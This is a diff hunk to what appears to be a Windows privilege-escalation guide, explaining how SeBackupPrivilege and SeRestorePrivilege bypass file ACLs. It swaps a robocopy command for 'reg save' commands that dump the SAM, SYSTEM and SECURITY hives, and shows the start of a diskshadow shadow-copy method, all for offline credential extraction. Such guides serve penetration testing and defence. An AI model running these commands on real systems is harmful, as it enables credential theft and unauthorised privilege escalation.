@@ -158,10 +158,12 @@ Check held privileges first — `whoami /priv` lists every enabled/disabled priv
 **Explanation**
 `SeBackupPrivilege` grants read access to *any* file on the filesystem regardless of DACL — the OS treats the request as a backup operation, not a normal file open, so it bypasses ACLs entirely for read. `SeRestorePrivilege` is the write-side mirror (bypasses ACLs for write, including ownership/attributes) and together they let you overwrite arbitrary files too. The single most valuable target is reading the SAM/SYSTEM hives (or `NTDS.dit` on a DC) for offline credential extraction — files normally locked/ACL'd against a non-SYSTEM reader. Note `copy`/`xcopy`/PowerShell `Copy-Item` do **not** use backup semantics by default and will still hit the ACL check — you need a tool that explicitly opens the file with `FILE_FLAG_BACKUP_SEMANTICS`.
 ```cmd
-:: robocopy honors backup semantics with /b (requires SeBackup+SeRestore held)
-robocopy /b C:\Windows\System32\config C:\Temp\hives SAM SYSTEM SECURITY
+:: reg save — works for live hives (requires admin/SeBackup)
+reg save HKLM\SAM C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+reg save HKLM\SECURITY C:\Temp\SECURITY
 
-:: alternative: diskshadow to snapshot the volume and read locked files off the shadow copy
+:: diskshadow — snapshot the volume and read locked files off the shadow copy
 diskshadow /s diskshadow_script.txt
 :: diskshadow_script.txt contents:
 ::   set context persistent nowriters
